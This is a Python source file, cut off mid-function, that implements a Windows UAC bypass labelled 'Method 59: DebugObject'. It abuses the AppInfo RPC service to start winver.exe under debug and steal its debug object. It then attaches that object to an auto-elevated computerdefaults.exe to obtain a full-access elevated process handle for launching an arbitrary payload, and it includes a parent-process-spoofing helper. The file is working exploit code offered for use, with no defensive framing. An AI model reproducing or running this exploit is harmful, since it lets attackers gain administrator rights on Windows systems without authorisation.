import sys
import os
import ctypes
from ctypes import wintypes, windll, byref, POINTER, c_void_p, c_ulong, c_long, sizeof, cast, create_unicode_buffer, memmove, addressof, memset, string_at, Structure, Union, c_bool, c_int, c_wchar_p, Array, c_byte
import struct
import subprocess
import traceback
INFINITE = 4294967295
CREATE_UNICODE_ENVIRONMENT = 1024
DEBUG_PROCESS = 1
PROCESS_ALL_ACCESS = 2035711
DBG_CONTINUE = 65538
CREATE_PROCESS_DEBUG_EVENT = 3
STARTF_USESHOWWINDOW = 1
EXTENDED_STARTUPINFO_PRESENT = 524288
PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 131072
CREATE_NEW_CONSOLE = 16
IID_ICMLUAUTIL = '{6EDD6D74-C007-4E75-B76A-E5740995E24C}'
ole32 = ctypes.windll.ole32
kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll
advapi32 = ctypes.windll.advapi32
PVOID = ctypes.c_void_p
HANDLE = wintypes.HANDLE
DWORD = wintypes.DWORD
ULONG = wintypes.ULONG
BOOL = wintypes.BOOL
HRESULT = LONG = ctypes.c_long
LPARAM = ctypes.c_long
UINT = ctypes.c_uint
SW_SHOW = 5
SW_HIDE = 0
class GUID(ctypes.Structure):
    _fields_ = [('Data1', ctypes.c_ulong), ('Data2', ctypes.c_ushort), ('Data3', ctypes.c_ushort), ('Data4', (ctypes.c_ubyte * 8))]
class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [('hProcess', HANDLE), ('hThread', HANDLE), ('dwProcessId', DWORD), ('dwThreadId', DWORD)]
class STARTUPINFOW(ctypes.Structure):
    _fields_ = [('cb', DWORD), ('lpReserved', wintypes.LPWSTR), ('lpDesktop', wintypes.LPWSTR), ('lpTitle', wintypes.LPWSTR), ('dwX', DWORD), ('dwY', DWORD), ('dwXSize', DWORD), ('dwYSize', DWORD), ('dwXCountChars', DWORD), ('dwYCountChars', DWORD), ('dwFillAttribute', DWORD), ('dwFlags', DWORD), ('wShowWindow', wintypes.WORD), ('cbReserved2', wintypes.WORD), ('lpReserved2', ctypes.c_void_p), ('hStdInput', HANDLE), ('hStdOutput', HANDLE), ('hStdError', HANDLE)]
class STARTUPINFOEXW(ctypes.Structure):
    _fields_ = [('StartupInfo', STARTUPINFOW), ('lpAttributeList', ctypes.c_void_p)]
class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [('nLength', DWORD), ('lpSecurityDescriptor', ctypes.c_void_p), ('bInheritHandle', BOOL)]
class CREATE_PROCESS_DEBUG_INFO(ctypes.Structure):
    _fields_ = [('hFile', HANDLE), ('hProcess', HANDLE), ('hThread', HANDLE), ('lpBaseOfImage', ctypes.c_void_p), ('dwDebugInfoFileOffset', DWORD), ('nDebugInfoSize', DWORD), ('lpThreadStartAddress', ctypes.c_void_p), ('lpImageName', ctypes.c_void_p), ('fUnicode', wintypes.WORD)]
class DEBUG_EVENT(ctypes.Structure):
    _fields_ = [('dwDebugEventCode', DWORD), ('dwProcessId', DWORD), ('dwThreadId', DWORD), ('dwBytesReserved', DWORD)]
ProcessDebugObjectHandle = 30
STATUS_SUCCESS = 0
kernel32.CreateProcessW.argtypes = [wintypes.LPCWSTR, wintypes.LPWSTR, ctypes.POINTER(SECURITY_ATTRIBUTES), ctypes.POINTER(SECURITY_ATTRIBUTES), BOOL, DWORD, ctypes.c_void_p, wintypes.LPCWSTR, ctypes.c_void_p, ctypes.POINTER(PROCESS_INFORMATION)]
kernel32.CreateProcessW.restype = BOOL
kernel32.WaitForDebugEvent.argtypes = [ctypes.c_void_p, DWORD]
kernel32.WaitForDebugEvent.restype = BOOL
kernel32.ContinueDebugEvent.argtypes = [DWORD, DWORD, DWORD]
kernel32.ContinueDebugEvent.restype = BOOL
kernel32.TerminateProcess.argtypes = [HANDLE, UINT]
kernel32.TerminateProcess.restype = BOOL
kernel32.CloseHandle.argtypes = [HANDLE]
kernel32.CloseHandle.restype = BOOL
kernel32.InitializeProcThreadAttributeList.argtypes = [ctypes.c_void_p, DWORD, DWORD, ctypes.POINTER(ctypes.c_size_t)]
kernel32.InitializeProcThreadAttributeList.restype = BOOL
kernel32.UpdateProcThreadAttribute.argtypes = [ctypes.c_void_p, DWORD, DWORD, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p]
kernel32.UpdateProcThreadAttribute.restype = BOOL
kernel32.DeleteProcThreadAttributeList.argtypes = [ctypes.c_void_p]
kernel32.DeleteProcThreadAttributeList.restype = None
ntdll.NtQueryInformationProcess.argtypes = [HANDLE, DWORD, ctypes.c_void_p, ULONG, ctypes.POINTER(ULONG)]
ntdll.NtQueryInformationProcess.restype = LONG
ntdll.NtDuplicateObject.argtypes = [HANDLE, HANDLE, HANDLE, ctypes.POINTER(HANDLE), ULONG, ULONG, ULONG]
ntdll.NtDuplicateObject.restype = LONG
ntdll.NtRemoveProcessDebug.argtypes = [HANDLE, HANDLE]
ntdll.NtRemoveProcessDebug.restype = LONG
ntdll.NtClose.argtypes = [HANDLE]
ntdll.NtClose.restype = LONG
try:
    ntdll.DbgUiSetThreadDebugObject.argtypes = [HANDLE]
    ntdll.DbgUiSetThreadDebugObject.restype = LONG
except AttributeError:
    pass
log = False
def method59(payload):
    global log
    log = False
    return debugobject_method(payload)
def get_system_directory():
    buf = ctypes.create_unicode_buffer(260)
    kernel32.GetSystemDirectoryW(buf, 260)
    return buf.value
def get_windows_directory():
    buf = ctypes.create_unicode_buffer(260)
    kernel32.GetWindowsDirectoryW(buf, 260)
    val = buf.value
    if (not val.endswith('\\')):
        val += '\\'
    return val
def to_bstr(s):
    return windll.oleaut32.SysAllocString(s)
def free_bstr(bstr):
    windll.oleaut32.SysFreeString(bstr)
def create_process_with_parent(parent_handle, command_line, current_dir=None):
    if (current_dir is None):
        current_dir = get_windows_directory()
    size = ctypes.c_size_t(0)
    kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(size))
    attr_list = ctypes.c_void_p(ctypes.windll.kernel32.HeapAlloc(ctypes.windll.kernel32.GetProcessHeap(), 0, size.value))
    if (not attr_list):
        return (False, None)
    if (not kernel32.InitializeProcThreadAttributeList(attr_list, 1, 0, ctypes.byref(size))):
        ctypes.windll.kernel32.HeapFree(ctypes.windll.kernel32.GetProcessHeap(), 0, attr_list)
        return (False, None)
    parent = HANDLE(parent_handle)
    if (not kernel32.UpdateProcThreadAttribute(attr_list, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ctypes.byref(parent), ctypes.sizeof(HANDLE), None, None)):
        kernel32.DeleteProcThreadAttributeList(attr_list)
        ctypes.windll.kernel32.HeapFree(ctypes.windll.kernel32.GetProcessHeap(), 0, attr_list)
        return (False, None)
    si = STARTUPINFOEXW()
    si.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEXW)
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW
    si.StartupInfo.wShowWindow = SW_SHOW
    si.lpAttributeList = attr_list
    si.StartupInfo.lpDesktop = 'WinSta0\\Default'
    pi = PROCESS_INFORMATION()
    cmd_w = ctypes.create_unicode_buffer(command_line)
    dir_w = ctypes.create_unicode_buffer(current_dir)
    result = kernel32.CreateProcessW(None, cmd_w, None, None, False, ((CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE) | EXTENDED_STARTUPINFO_PRESENT), None, dir_w, ctypes.byref(si), ctypes.byref(pi))
    kernel32.DeleteProcThreadAttributeList(attr_list)
    ctypes.windll.kernel32.HeapFree(ctypes.windll.kernel32.GetProcessHeap(), 0, attr_list)
    if result:
        if log:
            print(f'[+] CreateProcessW returned TRUE')
    if ((not pi.hProcess) or (pi.hProcess == 0)):
        if log:
            print(f'[-] Invalid process handle: {pi.hProcess}')
        return (False, None)
    if ((not pi.hThread) or (pi.hThread == 0)):
        if log:
            print(f'[-] Invalid thread handle: {pi.hThread}')
        return (False, None)
    if (pi.dwProcessId == 0):
        if log:
            print(f'[-] Invalid process ID: {pi.dwProcessId}')
        return (False, None)
    if log:
        print(f'[+] Process handle: {pi.hProcess:#x}, Thread handle: {pi.hThread:#x}')
    if log:
        print(f'[+] Process ID: {pi.dwProcessId}, Thread ID: {pi.dwThreadId}')
    exit_code = ctypes.c_ulong()
    if kernel32.GetExitCodeProcess(pi.hProcess, ctypes.byref(exit_code)):
        if log:
            print(f'[*] Initial exit code: {exit_code.value}')
        if (exit_code.value != 259):
            if log:
                print(f'[-] Process already exited with code: {exit_code.value}')
    if pi.hThread:
        kernel32.CloseHandle(pi.hThread)
    if pi.hProcess:
        kernel32.CloseHandle(pi.hProcess)
    return (True, pi)
class SHELLEXECUTEINFO(ctypes.Structure):
    _fields_ = [('cbSize', DWORD), ('fMask', ULONG), ('hwnd', HANDLE), ('lpVerb', ctypes.c_wchar_p), ('lpFile', ctypes.c_wchar_p), ('lpParameters', ctypes.c_wchar_p), ('lpDirectory', ctypes.c_wchar_p), ('nShow', ctypes.c_int), ('hInstApp', HANDLE), ('lpIDList', ctypes.c_void_p), ('lpClass', ctypes.c_wchar_p), ('hKeyClass', HANDLE), ('dwHotKey', DWORD), ('hIcon', HANDLE), ('hProcess', HANDLE)]
SEE_MASK_NOCLOSEPROCESS = 64
RPC_S_OK = 0
RPC_C_AUTHN_LEVEL_DEFAULT = 0
RPC_C_AUTHN_DEFAULT = 4294967295
class MONITOR_POINT(ctypes.Structure):
    _fields_ = [('MonitorLeft', ctypes.c_long), ('MonitorRight', ctypes.c_long)]
class APP_STARTUP_INFO(ctypes.Structure):
    _fields_ = [('lpszTitle', ctypes.c_wchar_p), ('dwX', ctypes.c_long), ('dwY', ctypes.c_long), ('dwXSize', ctypes.c_long), ('dwYSize', ctypes.c_long), ('dwXCountChars', ctypes.c_long), ('dwYCountChars', ctypes.c_long), ('dwFillAttribute', ctypes.c_long), ('dwFlags', ctypes.c_long), ('wShowWindow', ctypes.c_short), ('MonitorPoint', MONITOR_POINT)]
class APP_PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [('ProcessHandle', ctypes.c_size_t), ('ThreadHandle', ctypes.c_size_t), ('ProcessId', ctypes.c_long), ('ThreadId', ctypes.c_long)]
class RPC_ASYNC_STATE(ctypes.Structure):
    _fields_ = [('data', (ctypes.c_byte * 112))]
rpcrt4 = ctypes.windll.rpcrt4
rpcrt4.RpcStringBindingComposeW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.POINTER(ctypes.c_wchar_p)]
rpcrt4.RpcStringBindingComposeW.restype = ctypes.c_long
rpcrt4.RpcBindingFromStringBindingW.argtypes = [ctypes.c_wchar_p, ctypes.POINTER(ctypes.c_void_p)]
rpcrt4.RpcBindingFromStringBindingW.restype = ctypes.c_long
rpcrt4.RpcBindingSetAuthInfoW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_ulong]
rpcrt4.RpcBindingSetAuthInfoW.restype = ctypes.c_long
rpcrt4.RpcAsyncInitializeHandle.argtypes = [ctypes.c_void_p, ctypes.c_uint]
rpcrt4.RpcAsyncInitializeHandle.restype = ctypes.c_long
rpcrt4.RpcAsyncCompleteCall.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
rpcrt4.RpcAsyncCompleteCall.restype = ctypes.c_long
rpcrt4.RpcStringFreeW.argtypes = [ctypes.POINTER(ctypes.c_wchar_p)]
rpcrt4.RpcStringFreeW.restype = ctypes.c_long
rpcrt4.RpcBindingFree.argtypes = [ctypes.POINTER(ctypes.c_void_p)]
rpcrt4.RpcBindingFree.restype = ctypes.c_long
rpcrt4.NdrAsyncClientCall.restype = ctypes.c_void_p
RPC_S_OK = 0
RPC_C_AUTHN_LEVEL_DEFAULT = 0
RPC_C_AUTHN_DEFAULT = 4294967295
_PROC_FORMAT_STRING_BYTES = bytes([0, 0, 0, 72, 0, 0, 0, 0, 0, 0, 112, 0, 50, 0, 8, 0, 32, 0, 36, 0, 199, 12, 10, 1, 0, 0, 0, 0, 0, 0, 0, 0, 11, 0, 16, 0, 2, 0, 11, 0, 24, 0, 2, 0, 72, 0, 32, 0, 8, 0, 72, 0, 40, 0, 8, 0, 11, 1, 48, 0, 8, 0, 11, 1, 56, 0, 8, 0, 11, 1, 64, 0, 22, 0, 72, 0, 72, 0, 185, 0, 72, 0, 80, 0, 8, 0, 19, 97, 88, 0, 56, 0, 80, 33, 96, 0, 8, 0, 112, 0, 104, 0, 8, 0, 0])
_TYPE_FORMAT_STRING_BYTES = bytes([0, 0, 18, 8, 37, 92, 17, 8, 37, 92, 17, 0, 10, 0, 21, 3, 8, 0, 8, 8, 92, 91, 26, 3, 56, 0, 0, 0, 20, 0, 54, 8, 8, 8, 8, 8, 8, 8, 8, 6, 62, 76, 0, 227, 255, 64, 92, 91, 18, 8, 5, 92, 17, 4, 2, 0, 26, 3, 24, 0, 0, 0, 0, 0, 185, 185, 8, 8, 92, 91, 17, 12, 8, 92, 0])
class RPC_SYNTAX_IDENTIFIER(ctypes.Structure):
    _fields_ = [('SyntaxGUID', GUID), ('SyntaxVersion_Major', ctypes.c_ushort), ('SyntaxVersion_Minor', ctypes.c_ushort)]
class RPC_CLIENT_INTERFACE(ctypes.Structure):
    _fields_ = [('Length', ctypes.c_uint), ('InterfaceId', RPC_SYNTAX_IDENTIFIER), ('TransferSyntax', RPC_SYNTAX_IDENTIFIER), ('DispatchTable', ctypes.c_void_p), ('RpcProtseqEndpointCount', ctypes.c_uint), ('RpcProtseqEndpoint', ctypes.c_void_p), ('DefaultManagerEpv', ctypes.c_void_p), ('InterpreterInfo', ctypes.c_void_p), ('Flags', ctypes.c_uint)]
class MIDL_STUB_DESC(ctypes.Structure):
    _fields_ = [('RpcInterfaceInformation', ctypes.c_void_p), ('pfnAllocate', ctypes.c_void_p), ('pfnFree', ctypes.c_void_p), ('IMPLICIT_HANDLE_INFO', ctypes.c_void_p), ('apfnNdrRundownRoutines', ctypes.c_void_p), ('aGenericBindingRoutinePairs', ctypes.c_void_p), ('apfnExprEval', ctypes.c_void_p), ('aXmitQuintuple', ctypes.c_void_p), ('pFormatTypes', ctypes.c_void_p), ('fCheckBounds', ctypes.c_int), ('Version', ctypes.c_ulong), ('pMallocFreeStruct', ctypes.c_void_p), ('MIDLVersion', ctypes.c_long), ('CommFaultOffsets', ctypes.c_void_p), ('aUserMarshalQuadruple', ctypes.c_void_p), ('NotifyRoutineTable', ctypes.c_void_p), ('mFlags', ctypes.c_size_t), ('CsRoutineTables', ctypes.c_void_p), ('ProxyServerInfo', ctypes.c_void_p), ('pExprInfo', ctypes.c_void_p)]
_proc_fmt = (ctypes.c_ubyte * len(_PROC_FORMAT_STRING_BYTES))(*_PROC_FORMAT_STRING_BYTES)
_type_fmt = (ctypes.c_ubyte * len(_TYPE_FORMAT_STRING_BYTES))(*_TYPE_FORMAT_STRING_BYTES)
_rpc_client_iface = RPC_CLIENT_INTERFACE()
_rpc_client_iface.Length = ctypes.sizeof(RPC_CLIENT_INTERFACE)
_rpc_client_iface.InterfaceId.SyntaxGUID = GUID(538900890, 32672, 17484, (ctypes.c_ubyte * 8)(147, 153, 25, 186, 132, 241, 42, 26))
_rpc_client_iface.InterfaceId.SyntaxVersion_Major = 1
_rpc_client_iface.InterfaceId.SyntaxVersion_Minor = 0
_rpc_client_iface.TransferSyntax.SyntaxGUID = GUID(2324192516, 7403, 4553, (ctypes.c_ubyte * 8)(159, 232, 8, 0, 43, 16, 72, 96))
_rpc_client_iface.TransferSyntax.SyntaxVersion_Major = 2
_rpc_client_iface.TransferSyntax.SyntaxVersion_Minor = 0
_auto_bind_handle = ctypes.c_void_p(0)
kernel32.LoadLibraryW.restype = ctypes.c_void_p
kernel32.LoadLibraryW.argtypes = [ctypes.c_wchar_p]
kernel32.GetProcAddress.restype = ctypes.c_void_p
kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
kernel32.GetProcessHeap.restype = ctypes.c_void_p
kernel32.HeapAlloc.restype = ctypes.c_void_p
kernel32.HeapAlloc.argtypes = [ctypes.c_void_p, ctypes.c_ulong, ctypes.c_size_t]
kernel32.HeapFree.restype = ctypes.c_int
kernel32.HeapFree.argtypes = [ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p]
_process_heap = kernel32.GetProcessHeap()
@ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_size_t)
def _midl_user_allocate(size):
    return kernel32.HeapAlloc(_process_heap, 0, size)
@ctypes.WINFUNCTYPE(None, ctypes.c_void_p)
def _midl_user_free(p):
    kernel32.HeapFree(_process_heap, 0, p)
_stub_desc = MIDL_STUB_DESC()
_stub_desc.RpcInterfaceInformation = ctypes.addressof(_rpc_client_iface)
_stub_desc.pfnAllocate = ctypes.cast(_midl_user_allocate, ctypes.c_void_p).value
_stub_desc.pfnFree = ctypes.cast(_midl_user_free, ctypes.c_void_p).value
_stub_desc.IMPLICIT_HANDLE_INFO = ctypes.addressof(_auto_bind_handle)
_stub_desc.pFormatTypes = ctypes.addressof(_type_fmt)
_stub_desc.fCheckBounds = 1
_stub_desc.Version = 327682
_stub_desc.MIDLVersion = 134283886
_stub_desc.mFlags = 1
APPINFO_RPC = '201ef99a-7fa0-444c-9399-19ba84f12a1a'
RPC_C_AUTHN_LEVEL_PKT_PRIVACY = 6
RPC_C_AUTHN_WINNT = 10
RPC_C_IMP_LEVEL_IMPERSONATE = 3
RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH = 1
SECURITY_MAX_SID_SIZE = 68
WinLocalSystemSid = 22
class RPC_SECURITY_QOS_V3(ctypes.Structure):
    _fields_ = [('Version', ctypes.c_ulong), ('Capabilities', ctypes.c_ulong), ('IdentityTracking', ctypes.c_ulong), ('ImpersonationType', ctypes.c_ulong), ('AdditionalSecurityInfoType', ctypes.c_ulong), ('u', ctypes.c_void_p), ('Sid', ctypes.c_void_p)]
rpcrt4.RpcBindingSetAuthInfoExW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p]
rpcrt4.RpcBindingSetAuthInfoExW.restype = ctypes.c_long
advapi32.CreateWellKnownSid.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_ulong)]
advapi32.CreateWellKnownSid.restype = ctypes.c_int
def supCreateBindingHandle():
    string_binding = ctypes.c_wchar_p()
    status = rpcrt4.RpcStringBindingComposeW(APPINFO_RPC, 'ncalrpc', None, None, None, ctypes.byref(string_binding))
    if (status != RPC_S_OK):
        if log:
            print(f'[-] RpcStringBindingComposeW failed: {status}')
        return None
    if log:
        print(f'[D] String binding: {string_binding.value}')
    binding_handle = ctypes.c_void_p()
    status = rpcrt4.RpcBindingFromStringBindingW(string_binding, ctypes.byref(binding_handle))
    rpcrt4.RpcStringFreeW(ctypes.byref(string_binding))
    if (status != RPC_S_OK):
        if log:
            print(f'[-] RpcBindingFromStringBindingW failed: {status}')
        return None
    if log:
        print(f'[D] Binding handle from string: {binding_handle.value:#x}')
    cbSid = ctypes.c_ulong(SECURITY_MAX_SID_SIZE)
    local_system_sid = (ctypes.c_byte * SECURITY_MAX_SID_SIZE)()
    if (not advapi32.CreateWellKnownSid(WinLocalSystemSid, None, ctypes.byref(local_system_sid), ctypes.byref(cbSid))):
        if log:
            print(f'[-] CreateWellKnownSid failed: {kernel32.GetLastError()}')
        rpcrt4.RpcBindingFree(ctypes.byref(binding_handle))
        return None
    if log:
        print(f'[D] Created LocalSystem SID OK')
    sqos = RPC_SECURITY_QOS_V3()
    ctypes.memset(ctypes.byref(sqos), 0, ctypes.sizeof(sqos))
    sqos.Version = 3
    sqos.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE
    sqos.Capabilities = RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH
    sqos.IdentityTracking = 0
    sqos.Sid = ctypes.addressof(local_system_sid)
    status = rpcrt4.RpcBindingSetAuthInfoExW(binding_handle, None, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, None, 0, ctypes.byref(sqos))
    if (status != RPC_S_OK):
        if log:
            print(f'[-] RpcBindingSetAuthInfoExW failed: {status}')
        rpcrt4.RpcBindingFree(ctypes.byref(binding_handle))
        return None
    if log:
        print(f'[D] RpcBindingSetAuthInfoExW OK')
    return binding_handle
def AicLaunchAdminProcess(exe_path, cmd_line, start_flags, creation_flags, current_dir, window_station, hwnd, timeout, show_flags):
    pi = PROCESS_INFORMATION()
    pi.hProcess = None
    pi.hThread = None
    pi.dwProcessId = 0
    pi.dwThreadId = 0
    proc_info = APP_PROCESS_INFORMATION()
    ctypes.memset(ctypes.byref(proc_info), 0, ctypes.sizeof(proc_info))
    app_startup = APP_STARTUP_INFO()
    ctypes.memset(ctypes.byref(app_startup), 0, ctypes.sizeof(app_startup))
    app_startup.dwFlags = STARTF_USESHOWWINDOW
    app_startup.wShowWindow = show_flags
    async_state = RPC_ASYNC_STATE()
    ctypes.memset(ctypes.byref(async_state), 0, ctypes.sizeof(async_state))
    if log:
        print('[D] Creating RPC binding handle...')
    rpc_handle = supCreateBindingHandle()
    if (not rpc_handle):
        if log:
            print('[-] supCreateBindingHandle failed')
        return (False, pi)
    if log:
        print(f'[D] RPC binding handle         = {rpc_handle.value:#x}')
    if log:
        print('[D] RpcAsyncInitializeHandle...')
    status = rpcrt4.RpcAsyncInitializeHandle(ctypes.byref(async_state), ctypes.sizeof(async_state))
    if (status != RPC_S_OK):
        if log:
            print(f'[-] RpcAsyncInitializeHandle failed: {status}')
        rpcrt4.RpcBindingFree(ctypes.byref(rpc_handle))
        return (False, pi)
    if log:
        print(f'[D] RpcAsyncInitializeHandle OK')
    ctypes.memmove((ctypes.addressof(async_state) + 12), ctypes.byref(ctypes.c_uint(0)), 4)
    event_handle = kernel32.CreateEventW(None, False, False, None)
    if (not event_handle):
        if log:
            print('[-] CreateEventW failed')
        rpcrt4.RpcBindingFree(ctypes.byref(rpc_handle))
        return (False, pi)
    if log:
        print(f'[D] Event handle               = {event_handle}')
    event_ptr = ctypes.c_void_p(event_handle)
    ctypes.memmove((ctypes.addressof(async_state) + 24), ctypes.byref(event_ptr), ctypes.sizeof(ctypes.c_void_p))
    sig_buf = (ctypes.c_ubyte * 4)()
    ctypes.memmove(sig_buf, (ctypes.addressof(async_state) + 4), 4)
    if log:
        print(f'[D] Signature bytes: {bytes(sig_buf).hex()} (should be 00415653)')
    notif_buf = (ctypes.c_ubyte * 4)()
    ctypes.memmove(notif_buf, (ctypes.addressof(async_state) + 12), 4)
    if log:
        print(f'[D] NotificationType bytes: {bytes(notif_buf).hex()} (should be 01000000)')
    async_bytes = bytearray(((v & 255) for v in async_state.data[:40]))
    if log:
        print(f'[D] async_state[0:40]          = {async_bytes.hex()}')
    elevation_type = ctypes.c_long(0)
    _binding_val = (rpc_handle.value if hasattr(rpc_handle, 'value') else rpc_handle)
    import sys as _sys
    _sys.stdout.flush()
    try:
        import sys
        if log:
            print('[D] Calling NdrAsyncClientCall...', flush=True)
        sys.stdout.flush()
        rpcrt4.NdrAsyncClientCall.restype = ctypes.c_long
        result = rpcrt4.NdrAsyncClientCall(ctypes.c_void_p(ctypes.addressof(_stub_desc)), ctypes.c_void_p((ctypes.addressof(_proc_fmt) + 2)), ctypes.c_void_p(ctypes.addressof(async_state)), ctypes.c_void_p(_binding_val), ctypes.c_wchar_p(exe_path), ctypes.c_wchar_p(cmd_line), ctypes.c_long(start_flags), ctypes.c_long(creation_flags), ctypes.c_wchar_p(current_dir), ctypes.c_wchar_p(window_station), ctypes.c_void_p(ctypes.addressof(app_startup)), ctypes.c_uint64(0), ctypes.c_long(timeout), ctypes.c_void_p(ctypes.addressof(proc_info)), ctypes.c_void_p(ctypes.addressof(elevation_type)))
        if log:
            print(f'[D] NdrAsyncClientCall returned: 0x{(result & 4294967295):08X}')
        rpcrt4.RpcAsyncGetCallStatus.argtypes = [ctypes.c_void_p]
        rpcrt4.RpcAsyncGetCallStatus.restype = ctypes.c_long
        async_status = rpcrt4.RpcAsyncGetCallStatus(ctypes.byref(async_state))
        if log:
            print(f'[D] RpcAsyncGetCallStatus: 0x{(async_status & 4294967295):08X}')
        import time
        for i in range(100):
            async_status = rpcrt4.RpcAsyncGetCallStatus(ctypes.byref(async_state))
            if log:
                print(f'[D] Poll {i}: RpcAsyncGetCallStatus = 0x{(async_status & 4294967295):08X}')
            if (async_status != 997):
                break
            time.sleep(0.1)
        if log:
            print(f'[D] Final status: 0x{(async_status & 4294967295):08X}')
        reply = ctypes.c_void_p()
        rpc_status = rpcrt4.RpcAsyncCompleteCall(ctypes.byref(async_state), ctypes.byref(reply))
        if log:
            print(f'[D] RpcAsyncCompleteCall status={rpc_status}, reply={reply.value}')
        if ((rpc_status == 0) and ((reply.value is None) or (reply.value == 0))):
            if log:
                print(f'[D] proc_info: PH={proc_info.ProcessHandle}, TH={proc_info.ThreadHandle}, PID={proc_info.ProcessId}, TID={proc_info.ThreadId}')
            pi.hProcess = HANDLE(proc_info.ProcessHandle)
            pi.hThread = HANDLE(proc_info.ThreadHandle)
            pi.dwProcessId = proc_info.ProcessId
            pi.dwThreadId = proc_info.ThreadId
            kernel32.CloseHandle(event_handle)
            rpcrt4.RpcBindingFree(ctypes.byref(rpc_handle))
            return (True, pi)
        elif log:
            print(f'[-] RpcAsyncCompleteCall failed: status={rpc_status}, reply={reply.value}')
    except OSError as e:
        if log:
            print(f'[-] RPC OSError exception: {e}')
        import traceback
        traceback.print_exc()
    except Exception as e:
        if log:
            print(f'[-] RPC general exception: {type(e).__name__}: {e}')
        import traceback
        traceback.print_exc()
    kernel32.CloseHandle(event_handle)
    rpcrt4.RpcBindingFree(ctypes.byref(rpc_handle))
    return (False, pi)
class DEBUG_EVENT_FULL(ctypes.Structure):
    _fields_ = [('dwDebugEventCode', DWORD), ('dwProcessId', DWORD), ('dwThreadId', DWORD), ('hFile', HANDLE), ('hProcess', HANDLE), ('hThread', HANDLE), ('lpBaseOfImage', ctypes.c_void_p), ('dwDebugInfoFileOffset', DWORD), ('nDebugInfoSize', DWORD), ('lpThreadStartAddress', ctypes.c_void_p), ('lpImageName', ctypes.c_void_p), ('fUnicode', wintypes.WORD), ('_padding', (ctypes.c_byte * 86))]
def debugobject_method(executable):
    if log:
        print('[*] Method 59: DebugObject')
    sys_dir = get_system_directory()
    win_dir = get_windows_directory()
    winver_path = (sys_dir + '\\winver.exe')
    computerdefaults_path = (sys_dir + '\\computerdefaults.exe')
    debugObjectSet = False
    dbgHandle = HANDLE()
    dbgProcessHandle = None
    dupHandle = None
    procInfo = PROCESS_INFORMATION()
    T_DEFAULT_DESKTOP = 'WinSta0\\Default'
    try:
        if log:
            print('[*] Step 1: Spawning winver.exe under debug (non-elevated via RPC)...')
        (success, procInfo) = AicLaunchAdminProcess(winver_path, winver_path, 0, (CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS), win_dir, T_DEFAULT_DESKTOP, None, INFINITE, SW_HIDE)
        if (not success):
            if log:
                print('[-] AicLaunchAdminProcess failed for winver.exe')
            return 1
        if log:
            print(f'[*] winver.exe spawned via RPC, PID: {procInfo.dwProcessId}')
        status = ntdll.NtQueryInformationProcess(procInfo.hProcess, ProcessDebugObjectHandle, ctypes.byref(dbgHandle), ctypes.sizeof(HANDLE), None)
        if (status != STATUS_SUCCESS):
            if log:
                print(f'[-] NtQueryInformationProcess failed: 0x{(status & 4294967295):08X}')
            kernel32.TerminateProcess(procInfo.hProcess, 0)
            kernel32.CloseHandle(procInfo.hThread)
            kernel32.CloseHandle(procInfo.hProcess)
            return 1
        if log:
            print(f'[*] Got debug object handle: {dbgHandle.value}')
        ntdll.NtRemoveProcessDebug(procInfo.hProcess, dbgHandle)
        kernel32.TerminateProcess(procInfo.hProcess, 0)
        kernel32.CloseHandle(procInfo.hThread)
        kernel32.CloseHandle(procInfo.hProcess)
        if log:
            print('[*] Step 2: Spawning computerdefaults.exe under debug (elevated via RPC)...')
        (success, procInfo) = AicLaunchAdminProcess(computerdefaults_path, computerdefaults_path, 1, (CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS), win_dir, T_DEFAULT_DESKTOP, None, INFINITE, SW_HIDE)
        if (not success):
            if log:
                print('[-] AicLaunchAdminProcess failed for computerdefaults.exe')
            ntdll.NtClose(dbgHandle)
            return 1
        if log:
            print(f'[*] computerdefaults.exe spawned via RPC, PID: {procInfo.dwProcessId}')
        ntdll.DbgUiSetThreadDebugObject(dbgHandle)
        debugObjectSet = True
        dbg_event = DEBUG_EVENT_FULL()
        while True:
            if (not kernel32.WaitForDebugEvent(ctypes.byref(dbg_event), INFINITE)):
                if log:
                    print(f'[-] WaitForDebugEvent failed: {kernel32.GetLastError()}')
                break
            if (dbg_event.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT):
                dbgProcessHandle = dbg_event.hProcess
                if log:
                    print(f'[*] Got elevated process handle from debug event: {dbgProcessHandle}')
                break
            else:
                kernel32.ContinueDebugEvent(dbg_event.dwProcessId, dbg_event.dwThreadId, DBG_CONTINUE)
        if dbgProcessHandle:
            dup_handle = HANDLE()
            status = ntdll.NtDuplicateObject(dbgProcessHandle, HANDLE((- 1)), HANDLE((- 1)), ctypes.byref(dup_handle), PROCESS_ALL_ACCESS, 0, 0)
            if (status == STATUS_SUCCESS):
                if log:
                    print(f'[*] Duplicated handle with PROCESS_ALL_ACCESS: {dup_handle.value:#x}, creating payload...')
                pid_from_handle = ctypes.c_ulong()
